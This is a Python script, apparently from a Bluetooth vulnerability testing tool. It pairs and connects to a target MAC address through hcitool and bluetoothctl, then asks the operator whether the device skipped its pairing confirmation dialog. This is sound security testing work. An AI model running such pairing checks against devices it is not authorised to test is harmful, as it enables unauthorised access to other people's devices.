import argparse
import os
import logging
import subprocess
import signal
import psutil
import time

from sbleedyCLI.report import report_vulnerable, report_not_vulnerable, report_error
from sbleedyCLI.constants import LOG_FILE

HCITOOL_SCAN = "sudo -S hcitool scan"
HCITOOL_INFO = "sudo -S hcitool info {target}"
BLUETOOTHCTL_PAIR = "bluetoothctl pair {target}"
BLUETOOTHCTL_REMOVE = "bluetoothctl remove {target}"
BLUETOOTHCTL_CONNECT = "bluetoothctl connect {target}"
BT_AGENT_NINO = "bt-agent -c DisplayYesNo"


INSTRUCTIONS = """
1. Have your target device in discoverable and pairable mode. Always keep it that way
2. Once the promt to connect appears. Observe the following:
3. The target device should show a 6 digit number and a dialog to confirm or deny pairing.
4. Same dialog would appear on your device (but here it won't as we hide it)
5. The target device is vulnerable if the target device doesn't allow you to confirm or deny pairing on its screen
6. For this exploit click on deny.
7. Then a prompt would appear. Please enter Yes if the device was vulnerable, if not then enter No. If you had an error e.g. you didn't see any prompt on your device, then enter Error.
"""


def check_numeric_wrong_implementation(target):
    try:
        # Changing BT Agent to NoInputNoOutput
        process = subprocess.Popen(BT_AGENT_NINO, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(1)

        try:
            subprocess.check_output(BLUETOOTHCTL_REMOVE.format(target=target), shell=True)
        except subprocess.CalledProcessError as e:
            logging.info("nino_check.py -> Error removing the device: {}".format(e.output))
            #return

        pid = None
        # Running a scan to find the target device
        try:
            command = subprocess.Popen(HCITOOL_SCAN, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)         # for some reason doesn't accept tokenized exploit_command (leads to a bug)
            pid = command.pid
            command.wait(timeout=30)
            output = command.communicate()[0].decode()
            logging.info("nino_check.py -> output from HCITOOL_SCAN : " + str(output))
        except subprocess.TimeoutExpired as e:
            for child in psutil.Process(pid).children(recursive=True):
                child.kill()
            os.killpg(os.getpgid(command.pid), signal.SIGTERM)
            time.sleep(1)

        if output is not None and target in output:
            time.sleep(1)
            

            # Required to get information about the device, otherwise won't connect
            try:
                subprocess.check_output(HCITOOL_INFO.format(target=target), shell=True)
            except subprocess.CalledProcessError as e:
                logging.info("nino_check.py -> Error getting information about the device: {}".format(e.output))

            # Pair with the target device
            try:
                subprocess.check_output(BLUETOOTHCTL_PAIR.format(target=target), shell=True)
            except subprocess.CalledProcessError as e:
                logging.info("nino_check.py -> Error pairing with the device: {}".format(e.output))
                #return

            # Connect to the paired device
            try:
                output = subprocess.check_output(BLUETOOTHCTL_CONNECT.format(target=target), shell=True).decode()
            except subprocess.CalledProcessError as e:
                logging.info("nino_check.py -> Error connecting to the device: {}".format(e.output))
                #report_error("Couldn't connect to a device, error while connecting")
    except Exception as e:
        logging.info("nino_check.py -> Error: {}".format(str(e)))
        report_error("nino_check.py -> strange error: {}".format(str(e)))
    finally:
        if 'process' in locals():
            process.terminate()
            try:
                process.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
        logging.info("nino_check.py -> Finished")
    
    while True:
        answer = input("\nIf the device didn't show you buttons to pair and deny pairing then it is vulnerable\nIs it vulnerable?(Yes/No/Error):\n")

        if answer.lower().strip() == "yes":
            report_vulnerable("Marked by the user as vulnerable")
            break
        elif answer.lower().strip() == "no":
            report_not_vulnerable("Marked by the user as not vulnerable")
            break
        elif answer.lower().strip() == "error":
            report_error("According to the user an error occured")
            break
        else:
            print("Didn't understand your input. It should be one of the following: Yes/No/Error")

    


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=False, type=str, help="target MAC address")
    args = parser.parse_args()

    logging.basicConfig(filename=LOG_FILE, level=logging.INFO)

    if args.target:
        print(INSTRUCTIONS + "\n", flush=True)
        check_numeric_wrong_implementation(args.target)
    else:
        parser.print_help()

